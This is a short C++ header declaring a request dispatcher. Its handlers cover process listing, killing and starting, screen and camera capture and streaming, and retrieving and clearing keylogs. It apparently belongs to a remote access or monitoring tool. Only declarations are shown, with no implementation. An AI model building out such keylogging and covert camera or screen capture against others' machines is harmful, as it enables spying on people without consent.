#pragma once
#include "utils/json.hpp"
#include <string>

class Dispatcher {
public:
    Json handle(const Json& request);

private:
    Json handle_ping(const Json& req);
    Json handle_process_list(const Json& req);
    Json handle_process_kill(const Json& req);
    Json handle_process_start(const Json& req);
    Json handle_screen(const Json& req);
    Json handle_camera(const Json& req);
    Json handle_camera_video(const Json& req);
    Json handle_screen_stream(const Json& req);
    Json handle_cancel_all(const Json& req);

    Json handle_getkeylogs(const Json& req);
    Json handle_clearlogs(const Json& req);
};
